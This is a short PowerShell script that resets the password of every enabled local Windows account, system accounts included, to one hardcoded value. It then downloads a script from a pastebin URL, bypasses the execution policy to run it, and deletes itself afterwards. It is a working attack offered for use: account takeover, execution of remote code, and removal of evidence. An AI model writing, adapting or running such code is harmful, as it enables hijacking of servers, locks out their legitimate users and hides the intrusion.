# Define the new password as a secure string
$newPassword = ConvertTo-SecureString "IgotAnew5t1ck" -AsPlainText -Force

# Convert the secure string to plain text for net user command
$newPasswordPlainText = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($newPassword))

# Get all local users on the server (including system accounts)
$localUsers = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True AND Disabled=False"

# Loop through each user and set their password
foreach ($user in $localUsers) {
    try {
        # Change the password for the user
        net user $user.Name $newPasswordPlainText
        Write-Host "Password changed successfully for user: $($user.Name)"
    } catch {
        Write-Host "Failed to change password for user: $($user.Name) - $($_.Exception.Message)"
    }
}

# Download the external script
$scriptUrl = "https://pastebin.com/raw/CHcCUbEL"
$scriptPath = "thepower.ps1"  # Change this path as needed

try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
    Write-Host "Downloaded the script successfully."

    # Set execution policy to allow the script to run if necessary
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

    # Execute the downloaded script
    & $scriptPath
    Write-Host "Executed the script: $scriptPath"
} catch {
    Write-Host "Failed to download or execute the script - $($_.Exception.Message)"
}

# Self-destruct: Delete this script file
$scriptFilePath = $MyInvocation.MyCommand.Path
try {
    Remove-Item -Path $scriptFilePath -Force
    Write-Host "Self-destructed: Deleted the script file."
} catch {
    Write-Host "Failed to delete the script file - $($_.Exception.Message)"
}
